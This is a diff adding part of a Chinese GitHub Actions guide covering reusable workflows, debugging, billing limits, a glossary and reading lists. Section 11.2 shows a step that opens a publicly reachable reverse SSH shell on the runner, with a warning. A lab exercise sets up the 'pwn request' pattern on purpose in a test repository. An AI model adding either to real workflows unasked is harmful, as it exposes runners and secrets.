+<p><code>inputs.*</code> 和 <code>github.event.inputs.*</code> 是同一份数据的两个视图。<strong><code>inputs.*</code> 保留类型（boolean 就是 boolean），而 <code>github.event.inputs.*</code> 会把所有值转成字符串</strong>（<code>false</code> 变成 <code>&quot;false&quot;</code>，在 <code>if</code> 里判断时会当成真）。<strong>统一用 <code>inputs.*</code>。</strong></p>
+</div>
+<h3 id="ch-10-9">10.9 场景七：复用——composite action 与 reusable workflow</h3>
+<p>当多个 workflow 出现重复片段时，有两种复用机制，用途不同：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th></th>
+<th><strong>Composite Action</strong></th>
+<th><strong>Reusable Workflow</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>复用的是什么</td>
+<td>一串 <strong>step</strong></td>
+<td>一整个 <strong>job</strong>（含 runs-on、strategy、environment）</td>
+</tr>
+<tr>
+<td>位置</td>
+<td><code>.github/actions/&lt;name&gt;/action.yml</code></td>
+<td><code>.github/workflows/&lt;name&gt;.yml</code></td>
+</tr>
+<tr>
+<td>调用方式</td>
+<td><code>uses: ./.github/actions/&lt;name&gt;</code></td>
+<td><code>uses: ./.github/workflows/x.yml</code></td>
+</tr>
+<tr>
+<td>能否跨仓库</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>每步必须写 <code>shell:</code></td>
+<td>✅ 是</td>
+<td>不适用</td>
+</tr>
+<tr>
+<td>触发上下文</td>
+<td>继承调用者</td>
+<td>可通过 <code>on.workflow_call.inputs</code> 声明</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Reusable Workflow 的写法：</strong></p>
+<pre><code class="language-yaml"># .github/workflows/reusable-deploy.yml
+on:
+  workflow_call:
+    inputs:
+      environment:
+        type: string
+        required: true
+      source-path:
+        type: string
+        default: './dist'
+    secrets:
+      ssh-key:
+        required: true
+    outputs:
+      deployed-sha:
+        description: '部署的 commit'
+        value: ${{ jobs.deploy.outputs.sha }}
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    outputs:
+      sha: ${{ steps.d.outputs.sha }}
+    steps:
+      - uses: actions/checkout@v7
+      - id: d
+        run: |
+          echo &quot;部署 ${{ inputs.source-path }} 到 ${{ inputs.environment }}&quot;
+          echo &quot;sha=$GITHUB_SHA&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;
+</code></pre>
+<p>调用方<strong>只能使用这几个字段</strong>：<code>name</code>、<code>uses</code>、<code>with</code>、<code>secrets</code>、<code>strategy</code>、<code>needs</code>、<code>if</code>、<code>concurrency</code>、<code>permissions</code>、<code>cache-mode</code>。</p>
+<pre><code class="language-yaml">jobs:
+  staging:
+    uses: ./.github/workflows/reusable-deploy.yml
+    with:
+      environment: staging
+    secrets:
+      ssh-key: ${{ secrets.STAGING_SSH_KEY }}
+</code></pre>
+<p><strong>Reusable workflow 的四个限制：</strong></p>
+<ol>
+<li><strong>嵌套最多 10 层</strong>（GHES 是 4 层）。</li>
+<li>一个顶层文件最多引用 <strong>50 个</strong>不同的 reusable workflow。</li>
+<li><strong>workflow 级的 <code>env</code> 不会传递</strong>（双向都不传）。</li>
+<li><strong><code>GITHUB_TOKEN</code> 的权限只能被被调用方降级，不能被提权</strong>。runner 分配和计费都按<strong>调用方</strong>算。</li>
+</ol>
+<h3 id="ch-10-10">10.10 从零开始给任意项目加自动化的清单</h3>
+<p>把上面的经验抽象成一个通用流程：</p>
+<pre><code>① 明确目标
+   ├─ 只是想在 PR 上跑测试？        → 只需 CI（10.3）
+   ├─ 想自动发布版本？              → 加 Release（10.5）
+   ├─ 想自动部署？                  → 先解决&quot;网络可达性&quot;（10.2）
+   └─ 想定时做维护？                → 加 schedule（10.7）
+
+② 确定触发条件
+   ├─ 主分支推送 / PR → CI
+   ├─ tag 推送       → Release
+   ├─ 手动           → 运维脚本
+   └─ 定时           → 巡检、清理、报表
+
+③ 确定执行环境
+   ├─ 标准需求 → ubuntu-latest（免费、快）
+   ├─ 需要 macOS 签名 → macos-latest（贵 10 倍，注意并发上限 5）
+   ├─ 需要内网/特殊硬件 → self-hosted（先读 5.4 的安全红线）
+   └─ 需要数据库 → 用 services: 起容器，不要装到 runner 上
+
+④ 设计 job 图
+   ├─ 检查类任务全部并行（无 needs）
+   ├─ 构建 → 测试 → 部署 串行（有 needs）
+   └─ 用 outputs 传少量数据，用 artifacts 传文件
+
+⑤ 声明权限
+   └─ 从 permissions: contents: read 起手，按需加 scope
+      （记住：写了一个 scope，其余全变 none）
+
+⑥ 加固
+   ├─ 第三方 action pin 到 SHA
+   ├─ concurrency 控制并发
+   ├─ 部署走 environment + 审批
+   ├─ 云凭证用 OIDC 而不是长期密钥
+   └─ 加 actionlint / zizmor 到 CI
+
+⑦ 让失败可见
+   ├─ 失败时打印足够的诊断信息
+   ├─ 用 ::error file=X:: 把错误标到 PR 上
+   └─ 关键流程加通知（Issue / IM webhook）
+</code></pre>
+
+      </section>
+
+      <section class="chapter" id="ch-11">
+        <div class="chapter-head"><span class="chapter-no">11</span><h2>十一、调试与排错</h2></div>
+<h3 id="ch-11-1">11.1 日志在哪</h3>
+<pre><code>仓库 → Actions → 选择 workflow → 选择某次运行
+  ├─ 左侧：job 列表（可以点进单个 job 看 step 展开）
+  ├─ 每个 step 展开后是完整的 stdout/stderr
+  ├─ 右上角 &quot;Download log archive&quot; 可以下载完整日志 zip
+  └─ 失败时，失败的那一行会有 `::error::` 标注
+</code></pre>
+<p><strong>两个关键日志开关</strong>（在仓库 Settings → Secrets and variables → Actions 里加）：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ACTIONS_STEP_DEBUG</code> = <code>true</code></td>
+<td>步骤级调试日志（runner 会输出更多内部信息）</td>
+</tr>
+<tr>
+<td><code>ACTIONS_RUNNER_DEBUG</code> = <code>true</code></td>
+<td>runner 诊断日志，会在日志 zip 里多出 <code>runner-diagnostic-logs/</code> 目录，包含 runner 进程日志和 worker 进程日志</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout"><p class="callout-title">不用建 secret 也能开调试</p>
+<p><strong>任何能触发 workflow 的人，都可以在&quot;重新运行&quot;时勾选启用调试日志</strong>——不需要仓库管理员配 secret。UI 上 Re-run jobs → 勾选 &quot;Enable debug logging&quot;。这是临时排查最方便的方式。</p>
+</div>
+<p><strong><code>runner.debug</code> 上下文</strong>可以让你写&quot;只在调试模式下才执行&quot;的步骤：</p>
+<pre><code class="language-yaml">- name: 打印环境诊断信息
+  if: ${{ runner.debug == '1' }}
+  run: |
+    env | sort
+    df -h
+    free -m
+</code></pre>
+<h3 id="ch-11-2">11.2 交互式调试</h3>
+<p>想知道 runner 里到底长什么样，可以用 <code>tmate</code> 类 action 开一个反向 SSH 会话：</p>
+<pre><code class="language-yaml">- name: 打开调试会话
+  if: ${{ github.event_name == 'workflow_dispatch' }}
+  uses: mxschmitt/action-tmate@v3
+  timeout-minutes: 15
+</code></pre>
+
+<div class="callout warning"><p class="callout-title">这会把一个可登录的 shell 暴露到公网</p>
+<p>一定要限制触发条件（上面的 <code>if</code> 只是个例子，实际上任何人都能手动触发 <code>workflow_dispatch</code>），或者加上 <code>limited-access</code> 之类的输入限制。<strong>用完立刻取消运行。</strong></p>
+</div>
+<h3 id="ch-11-3">11.3 本地运行</h3>
+<p><code>act</code> 可以在本地用 Docker 跑 workflow（当前版本 <strong>v0.2.89</strong>，仍在积极维护）：</p>
+<pre><code class="language-bash">act -l                                    # 列出可触发的 workflow
+act push                                  # 模拟 push 事件
+act pull_request -j test                  # 只跑 test job
+act -s GITHUB_TOKEN=xxx                   # 传入 secret
+act --reuse                                # 复用容器，加速
+</code></pre>
+<p><strong>但它是把 GitHub 的调度逻辑重写了一遍</strong>，不是真正的 runner。以下场景不要指望它：</p>
+<ul>
+<li><code>actions/cache</code>（需要真实的缓存服务）</li>
+<li>artifact 上传下载（需要 OIDC/token 链路）</li>
+<li>托管 runner 特有的行为（<code>GITHUB_TOKEN</code> 的真实权限模型）</li>
+<li>各种平台特定的环境差异</li>
+</ul>
+<p><strong>用它的正确姿势</strong>：本地快速验证 shell 脚本逻辑和 YAML 语法，正式验证还是推到 GitHub。</p>
+<h3 id="ch-11-4">11.4 静态检查</h3>
+<pre><code class="language-bash"># actionlint：语法 + shellcheck + 表达式类型
+brew install actionlint            # 或下载二进制
+actionlint -color
+
+# zizmor：安全审计
+pipx install zizmor
+zizmor .github/workflows/
+zizmor --format sarif .github/workflows/ &gt; results.sarif   # 可以上传到 GitHub 的 code scanning
+</code></pre>
+<h3 id="ch-11-5">11.5 常见故障对照表</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>症状</th>
+<th>最可能的原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>推了代码，Actions 里什么都没出现</strong></td>
+<td>① workflow 文件不在 <code>.github/workflows/</code> ② YAML 语法错误 ③ <code>on:</code> 过滤器没匹配上（<code>branches</code>/<code>paths</code> 是 AND） ④ 仓库的 Actions 被禁用了</td>
+</tr>
+<tr>
+<td><strong><code>workflow_dispatch</code> 没有按钮</strong></td>
+<td>该 workflow 不存在于<strong>默认分支</strong></td>
+</tr>
+<tr>
+<td><strong>PR 里改的 workflow 没生效</strong></td>
+<td><code>pull_request</code> 事件用的是合并提交里的文件；如果是 <code>pull_request_target</code>，用的是默认分支的文件</td>
+</tr>
+<tr>
+<td><strong>环境变量在下一个 step 里不见了</strong></td>
+<td>用了 <code>export</code> 而不是写 <code>$GITHUB_ENV</code>（见 6.6）</td>
+</tr>
+<tr>
+<td><strong><code>cd</code> 到子目录后下一个 step 又回根目录</strong></td>
+<td>每个 <code>run</code> 是新 shell。用 <code>working-directory:</code>（见 6.4）</td>
+</tr>
+<tr>
+<td><strong><code>::set-output</code> 报错或不起作用</strong></td>
+<td>该命令已移除，改用 <code>$GITHUB_OUTPUT</code>（见 6.6）</td>
+</tr>
+<tr>
+<td><strong>job 一直停在 Queued</strong></td>
+<td>并发配额用完了（Free 20 / macOS 5），或者 <code>runs-on</code> 的标签没有匹配的 runner</td>
+</tr>
+<tr>
+<td><strong><code>if:</code> 里的条件没生效</strong></td>
+<td>以 <code>!</code> 开头时没写 <code>${{ }}</code>；或者忘了隐含的 <code>success()</code>（见 6.5）</td>
+</tr>
+<tr>
+<td><strong>矩阵跑了一堆不必要的组合</strong></td>
+<td><code>exclude</code> 是部分匹配，<code>include</code> 在 <code>exclude</code> 之后处理（见 6.3）</td>
+</tr>
+<tr>
+<td><strong>多个 job 上传同名 artifact 报错</strong></td>
+<td>upload-artifact v4+ 不允许同名，名字里加上 <code>matrix.*</code> 区分（见 9.3）</td>
+</tr>
+<tr>
+<td><strong>PR 评论/打标签失败</strong></td>
+<td>显式写了 <code>permissions:</code> 导致未列出的 scope 变成 <code>none</code>（见 8.2）</td>
+</tr>
+<tr>
+<td><strong>YAML 解析错误</strong></td>
+<td>用了 Tab 缩进；或者模式以 <code>*</code>/<code>!</code> 开头没加引号</td>
+</tr>
+<tr>
+<td><strong>私有依赖拉不下来</strong></td>
+<td>secrets 没配；fork PR 拿不到 secrets（这是设计如此）</td>
+</tr>
+<tr>
+<td><strong>macOS job 排队很久</strong></td>
+<td>macOS 并发上限只有 5，是共享的（标准 + 大型 runner 都算）</td>
+</tr>
+</tbody>
+</table></div>
+
+      </section>
+
+      <section class="chapter" id="ch-12">
+        <div class="chapter-head"><span class="chapter-no">12</span><h2>十二、成本与限额</h2></div>
+<h3 id="ch-12-1">12.1 免费的部分</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>是否免费</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>公开仓库 + 标准 GitHub 托管 runner</strong></td>
+<td>✅ 完全免费、不限分钟数</td>
+</tr>
+<tr>
+<td><strong>任何仓库 + self-hosted runner</strong></td>
+<td>✅ 免费（GitHub 不计费，你付自己的电费和运维）</td>
+</tr>
+<tr>
+<td>私有仓库 + 标准 runner</td>
+<td>❌ 消耗套餐内分钟数，超出后按分钟计费</td>
+</tr>
+<tr>
+<td><strong>大型 runner（larger runners）</strong></td>
+<td>❌ 即使是公开仓库也计费，且<strong>不能用套餐内分钟数抵扣</strong></td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="ch-12-2">12.2 私有仓库的额度</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>套餐</th>
+<th>每月分钟数</th>
+<th>Artifact 存储</th>
+<th>Cache 存储</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Free（个人）</td>
+<td>2,000</td>
+<td>500 MB</td>
+<td>10 GB / 仓库</td>
+</tr>
+<tr>
+<td>Pro</td>
+<td>3,000</td>
+<td>1 GB</td>
+<td>10 GB / 仓库</td>
+</tr>
+<tr>
+<td>Free（组织）</td>
+<td>2,000</td>
+<td>500 MB</td>
+<td>10 GB / 仓库</td>
+</tr>
+<tr>
+<td>Team</td>
+<td>3,000</td>
+<td>2 GB</td>
+<td>10 GB / 仓库</td>
+</tr>
+<tr>
+<td>Enterprise Cloud</td>
+<td>50,000</td>
+<td>50 GB</td>
+<td>10 GB / 仓库</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>注意 artifact 存储和 Packages 存储共享一个额度池，而缓存是单独的 10 GB/仓库</strong>。缓存在计费上更宽松。</p>
+<h3 id="ch-12-3">12.3 每分钟费率（标准 runner，四舍五入到整分钟）</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>配置</th>
+<th>单价</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Linux 1 核（<code>ubuntu-slim</code>）</td>
+<td>$0.002</td>
+</tr>
+<tr>
+<td>Linux 2 核 x64</td>
+<td>$0.006</td>
+</tr>
+<tr>
+<td>Linux 2 核 arm64</td>
+<td>$0.005</td>
+</tr>
+<tr>
+<td>Windows 2 核</td>
+<td>$0.010</td>
+</tr>
+<tr>
+<td><strong>macOS（3 核 M1 或 4 核 Intel）</strong></td>
+<td><strong>$0.062</strong></td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout warning"><p class="callout-title">macOS 是 Linux 的 10 倍</p>
+<p>一个跑 20 分钟的 macOS job 花 $1.24，同样的 Linux job 花 $0.12。<strong>只在真正需要 Xcode / 代码签名时才用 macOS runner。</strong> 能用 Linux 交叉编译的场景就不要上 macOS。</p>
+</div>
+<h3 id="ch-12-4">12.4 硬性限额</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>限制项</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>单个 job 执行时长（托管）</strong></td>
+<td><strong>6 小时</strong></td>
+</tr>
+<tr>
+<td>单个 job 执行时长（self-hosted）</td>
+<td>5 天</td>
+</tr>
+<tr>
+<td><strong>整个 workflow run 的总时长</strong>（含等待与审批）</td>
+<td><strong>35 天</strong>，之后取消</td>
+</tr>
+<tr>
+<td>Environment 审批最长等待</td>
+<td>30 天</td>
+</tr>
+<tr>
+<td>自建 runner 的 job 排队时长</td>
+<td>24 小时（超时自动取消）</td>
+</tr>
+<tr>
+<td><code>ubuntu-slim</code> job 超时</td>
+<td>15 分钟</td>
+</tr>
+<tr>
+<td><strong>矩阵 job 数</strong></td>
+<td><strong>256 / 每次运行</strong></td>
+</tr>
+<tr>
+<td><strong>重新运行次数</strong></td>
+<td><strong>50 次 / 每次运行</strong></td>
+</tr>
+<tr>
+<td><strong>workflow 文件大小</strong></td>
+<td><strong>500 KB</strong>（超过不会启动）</td>
+</tr>
+<tr>
+<td>并发（Free / Pro / Team / Enterprise）</td>
+<td>20 / 40 / 60 / 500</td>
+</tr>
+<tr>
+<td>并发（macOS，所有套餐）</td>
+<td>5（Team / Enterprise 的大型 runner 另计）</td>
+</tr>
+<tr>
+<td>缓存操作速率</td>
+<td>200 上传 / 1500 下载 / 400 删除，每分钟每仓库</td>
+</tr>
+<tr>
+<td>artifact 与日志保留</td>
+<td>默认 90 天（公开 1–90，私有 1–400）</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout"><p class="callout-title">支持也不能提的限额</p>
+<p>存储额度和 workflow run 总时长（35 天）是硬限制，<strong>GitHub 支持也改不了</strong>。并发数可以申请提升。</p>
+</div>
+<h3 id="ch-12-5">12.5 省钱的六个技巧</h3>
+<ol>
+<li><strong>用 <code>concurrency</code> + <code>cancel-in-progress: true</code></strong>。连续推 5 次，只跑最后一次——对文档仓库能省掉 80% 的运行。</li>
+<li><strong><code>paths</code> 过滤</strong>。改了 <code>doc/</code> 就别触发前端构建。</li>
+<li><strong><code>timeout-minutes</code></strong>。默认没有超时（只有 6 小时的硬上限）。一个卡住的任务能悄悄烧掉 6 小时的钱。</li>
+<li><strong>缓存依赖</strong>。<code>setup-node</code> 的 <code>cache: 'npm'</code> 一行通常能省 30 秒以上。</li>
+<li><strong><code>fail-fast: true</code>（默认值）</strong>。矩阵里第一个失败就取消其余——除非你真的想看到所有平台的失败情况。</li>
+<li><strong>能用公开仓库就用公开仓库</strong>。这是最根本的一条：公开仓库的标准 runner 完全免费。</li>
+</ol>
+
+      </section>
+
+      <section class="chapter" id="ch-13">
+        <div class="chapter-head"><span class="chapter-no">13</span><h2>十三、关键概念速查表</h2></div>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>英文</th>
+<th>一句话解释</th>
+<th>章节</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>工作流</td>
+<td>Workflow</td>
+<td>一个 <code>.github/workflows/*.yml</code> 文件定义的完整流水线</td>
+<td>3.2</td>
+</tr>
+<tr>
+<td>作业</td>
+<td>Job</td>
+<td>一次执行单元，独占一台机器，job 间默认并行且隔离</td>
+<td>3.2</td>
+</tr>
+<tr>
+<td>步骤</td>
+<td>Step</td>
+<td>一条命令或一个 action，顺序执行，共享文件系统</td>
+<td>3.2</td>
+</tr>
+<tr>
+<td>动作</td>
+<td>Action</td>
+<td>可复用的构建块，分 JS / Docker / Composite 三种</td>
+<td>7.1</td>
+</tr>
+<tr>
+<td>执行器</td>
+<td>Runner</td>
+<td>真正执行 job 的机器，托管（Azure VM）或自建</td>
+<td>5.1</td>
+</tr>
+<tr>
+<td>事件</td>
+<td>Event</td>
+<td>仓库上发生的事情，触发 workflow 的源头</td>
+<td>4.2</td>
+</tr>
+<tr>
+<td>引用更新</td>
+<td>Ref update</td>
+<td><code>git push</code> 的本质：把某个 ref 从 A 改成 B</td>
+<td>4.1</td>
+</tr>
+<tr>
+<td>活动类型</td>
+<td>Activity type</td>
+<td>同一事件的不同细分（如 PR 的 opened/synchronize/closed）</td>
+<td>4.4</td>
+</tr>
+<tr>
+<td>路径过滤</td>
+<td>paths filter</td>
+<td>根据本次推送改动的文件决定是否触发，与 branches 是 AND</td>
+<td>4.4</td>
+</tr>
+<tr>
+<td>长轮询</td>
+<td>Long poll</td>
+<td>runner 主动挂起的取任务请求，使其可工作在 NAT 后</td>
+<td>5.2</td>
+</tr>
+<tr>
+<td>临时执行器</td>
+<td>Ephemeral runner</td>
+<td>跑完一个 job 即销毁的 runner，是安全与隔离的基础</td>
+<td>5.1, 5.4</td>
+</tr>
+<tr>
+<td>执行器控制器</td>
+<td>ARC</td>
+<td>Actions Runner Controller，K8s 上自建 runner 的官方方案</td>
+<td>5.4</td>
+</tr>
+<tr>
+<td>上下文</td>
+<td>Context</td>
+<td><code>${{ }}</code> 里可访问的 12 个命名空间</td>
+<td>6.5</td>
+</tr>
+<tr>
+<td>表达式</td>
+<td>Expression</td>
+<td><code>${{ }}</code> 内的求值语法，支持函数与状态函数</td>
+<td>6.5</td>
+</tr>
+<tr>
+<td>步骤输出</td>
+<td>Step output</td>
+<td>通过 <code>$GITHUB_OUTPUT</code> 文件传给后续 step 的值</td>
+<td>6.6</td>
+</tr>
+<tr>
+<td>环境文件</td>
+<td>Env file</td>
+<td><code>$GITHUB_ENV</code> / <code>$GITHUB_PATH</code> 等，跨 step 生效的临时文件机制</td>
+<td>6.6</td>
+</tr>
+<tr>
+<td>步骤摘要</td>
+<td>Step summary</td>
+<td>写进 <code>$GITHUB_STEP_SUMMARY</code> 的 Markdown，显示在运行页面</td>
+<td>6.6</td>
+</tr>
+<tr>
+<td>矩阵</td>
+<td>Matrix</td>
+<td>一组参数笛卡尔积展开成多个并行 job，上限 256</td>
+<td>6.3</td>
+</tr>
+<tr>
+<td>依赖图</td>
+<td>needs / DAG</td>
+<td>用 <code>needs</code> 声明 job 前后关系，无依赖则并行</td>
+<td>6.3</td>
+</tr>
+<tr>
+<td>并发组</td>
+<td>Concurrency</td>
+<td>同组运行互斥，可选取消进行中的旧运行</td>
+<td>6.2</td>
+</tr>
+<tr>
+<td>安装访问令牌</td>
+<td>GITHUB_TOKEN</td>
+<td>每 job 签发的 GitHub App 安装令牌，job 结束即失效</td>
+<td>8.1</td>
+</tr>
+<tr>
+<td>权限声明</td>
+<td>permissions</td>
+<td>显式声明 token 的 scope；列出一个则其余全为 none</td>
+<td>8.2</td>
+</tr>
+<tr>
+<td>密钥</td>
+<td>Secrets</td>
+<td>加密存储的敏感值，日志中自动打码</td>
+<td>8.3</td>
+</tr>
+<tr>
+<td>变量</td>
+<td>Variables</td>
+<td>非敏感的仓库/组织级配置值</td>
+<td>8.3</td>
+</tr>
+<tr>
+<td>环境</td>
+<td>Environment</td>
+<td>部署目标，支持审批人、等待时间、环境级密钥</td>
+<td>8.3</td>
+</tr>
+<tr>
+<td>开放身份连接</td>
+<td>OIDC</td>
+<td>用短期 JWT 换取云厂商临时凭证，免长期密钥</td>
+<td>8.4</td>
+</tr>
+<tr>
+<td>可信发布</td>
+<td>Trusted Publishing</td>
+<td>用 OIDC 免密钥发布到 PyPI / npm</td>
+<td>8.4</td>
+</tr>
+<tr>
+<td>请求攻击</td>
+<td>pwn request</td>
+<td><code>pull_request_target</code> + checkout fork 代码导致泄密</td>
+<td>8.5</td>
+</tr>
+<tr>
+<td>模板注入</td>
+<td>Script injection</td>
+<td>把不可信内容直接插进 <code>run</code> 脚本导致命令执行</td>
+<td>8.5</td>
+</tr>
+<tr>
+<td>缓存</td>
+<td>Cache</td>
+<td>加速用的可丢弃数据，key 匹配 + 前缀回退</td>
+<td>9.1</td>
+</tr>
+<tr>
+<td>产物</td>
+<td>Artifact</td>
+<td>需要保存/传递的构建结果，v4 起不可变</td>
+<td>9.1</td>
+</tr>
+<tr>
+<td>可复用工作流</td>
+<td>Reusable workflow</td>
+<td>把整个 job 封装供其他 workflow 调用，最多嵌套 10 层</td>
+<td>10.9</td>
+</tr>
+<tr>
+<td>复合动作</td>
+<td>Composite action</td>
+<td>把一串 step 封装成一个 <code>uses:</code> 单元</td>
+<td>7.1, 10.9</td>
+</tr>
+<tr>
+<td>不可变发布</td>
+<td>Immutable release</td>
+<td>发布后 tag 不可移动、assets 不可修改</td>
+<td>10.5</td>
+</tr>
+<tr>
+<td>制品证明</td>
+<td>Attestation</td>
+<td>为产物生成可验证的来源证明，用 <code>gh attestation verify</code> 校验</td>
+<td>8.4</td>
+</tr>
+</tbody>
+</table></div>
+
+      </section>
+
+      <section class="chapter" id="ch-14">
+        <div class="chapter-head"><span class="chapter-no">14</span><h2>十四、延伸阅读</h2></div>
+<h3 id="ch-14-1">官方文档（权威来源）</h3>
+<ul>
+<li><strong><a href="https://docs.github.com/en/actions" target="_blank" rel="noopener">GitHub Actions 文档</a></strong> —— 一切的起点，特别是这几页：
+<ul>
+<li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax" target="_blank" rel="noopener">Workflow syntax</a> —— 字段完整参考</li>
+<li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows" target="_blank" rel="noopener">Events that trigger workflows</a> —— 所有事件与过滤器的精确语义</li>
+<li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/expressions" target="_blank" rel="noopener">Expressions</a> —— 上下文、运算符、函数</li>
+<li><a href="https://docs.github.com/en/actions/reference/limits" target="_blank" rel="noopener">Usage limits</a> —— 限额表</li>
+<li><a href="https://docs.github.com/en/actions/reference/security/secure-use" target="_blank" rel="noopener">Security hardening</a> —— 安全实践</li>
+<li><a href="https://docs.github.com/en/actions/reference/security/oidc" target="_blank" rel="noopener">OIDC</a> —— 免密钥上云的完整流程</li>
+</ul>
+</li>
+</ul>
+<h3 id="ch-14-2">源码与实现</h3>
+<ul>
+<li><strong><a href="https://github.com/actions/runner" target="_blank" rel="noopener">actions/runner</a></strong> —— runner 本身的实现。想看 5.2 节的加密细节，去读 <code>src/Runner.Listener/MessageListener.cs</code> 和 <code>RSAEncryptedFileKeyManager</code></li>
+<li><strong><a href="https://github.com/actions/runner-images" target="_blank" rel="noopener">actions/runner-images</a></strong> —— 每个镜像预装了哪些工具的权威清单，找 <code>images/ubuntu/Ubuntu2404-Readme.md</code></li>
+<li><strong><a href="https://github.com/actions/checkout" target="_blank" rel="noopener">actions/checkout</a></strong> / <strong><a href="https://github.com/actions/cache" target="_blank" rel="noopener">actions/cache</a></strong> —— 官方 action 的 README 通常比文档更早更新</li>
+<li><strong><a href="https://github.com/actions/toolkit" target="_blank" rel="noopener">actions/artifact</a></strong> —— 9.3 节讲的 Blob 上传路径在 <code>packages/artifact/src/internal/</code> 下</li>
+</ul>
+<h3 id="ch-14-3">工具</h3>
+<ul>
+<li><strong><a href="https://github.com/rhysd/actionlint" target="_blank" rel="noopener">actionlint</a></strong> —— workflow 静态检查，建议加进 CI</li>
+<li><strong><a href="https://github.com/woodruffw/zizmor" target="_blank" rel="noopener">zizmor</a></strong> —— 安全审计，能发现模板注入和过度权限</li>
+<li><strong><a href="https://github.com/nektos/act" target="_blank" rel="noopener">act</a></strong> —— 本地运行 workflow</li>
+<li><strong><a href="https://docs.github.com/en/code-security/dependabot" target="_blank" rel="noopener">Dependabot</a></strong> —— 自动升级 pin 到 SHA 的 action</li>
+</ul>
+<h3 id="ch-14-4">延伸阅读（本知识库）</h3>
+<ul>
+<li><a href="../frp-nginx-networking-guide.html">内网穿透 + Nginx HTTPS 详解</a> —— 本篇 10.4 节的 self-hosted runner 部署方案，与本知识库现有的 frp + Nginx 架构直接衔接</li>
+<li><a href="../cpp-build-toolchain-runtime-guide.html">C/C++ 构建工具链与运行时</a> —— 如果把 CI 用于 Windows C++ 项目的构建，DLL 导入导出是常踩的坑</li>
+</ul>
+<h3 id="ch-14-5">动手实验</h3>
+<ol>
+<li>在任意仓库加一个只 <code>echo</code> 的 workflow，确认它能在 push 后被触发</li>
+<li>故意把 YAML 缩进改错，观察&quot;workflow 不启动&quot;时 UI 上的提示在哪里</li>
+<li>用 <code>paths:</code> 过滤，验证&quot;只改 doc/ 时前端构建不触发&quot;</li>
+<li>在两个 job 之间用 <code>outputs</code> 传一个值，再用 artifact 传一个文件，体会两者的差异</li>
+<li>写一个 <code>pull_request_target</code> 的 workflow 并<strong>故意 checkout fork 代码</strong>，观察 token 权限是被如何限制的（在安全的测试仓库里做）</li>
+<li>给一个部署 workflow 加上 <code>environment</code> + Required reviewers，体会审批流程</li>
+<li>用 <code>act -l</code> 在本地列出 workflow，再用 <code>act push</code> 跑一次最简单的那个</li>
+</ol>
+
+      </section>
+    </main>
+  </div>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      <div><strong>YJ Knowledge Bank</strong> · 内容核对于 2026-09-21</div>
+      <div><a href="../../index.html">返回知识库</a></div>
+    </div>
+  </footer>
+
+  <script>
+    /* TOC scroll-highlighting. Enhancement only: the page reads fine without it. */
+    (function () {
+      var links = [].slice.call(document.querySelectorAll('.toc a'));
+      var sections = links
+        .map(function (a) { return document.querySelector(a.getAttribute('href')); })
+        .filter(Boolean);
+      if (!sections.length || !('IntersectionObserver' in window)) return;
+
+      var visible = new Set();
+      function sync() {
+        var current = null;
+        for (var i = 0; i < sections.length; i++) {
+          if (visible.has(sections[i])) { current = sections[i]; break; }
+        }
+        links.forEach(function (a) {
+          a.classList.toggle('active', !!current && a.getAttribute('href') === '#' + current.id);
+        });
+      }
+      var observer = new IntersectionObserver(function (entries) {
+        entries.forEach(function (e) {
+          if (e.isIntersecting) visible.add(e.target);
+          else visible.delete(e.target);
+        });
+        sync();
+      }, { rootMargin: '-88px 0px -60% 0px', threshold: 0 });
+      sections.forEach(function (s) { observer.observe(s); });
+    })();
+  </script>
+</body>
+</html>
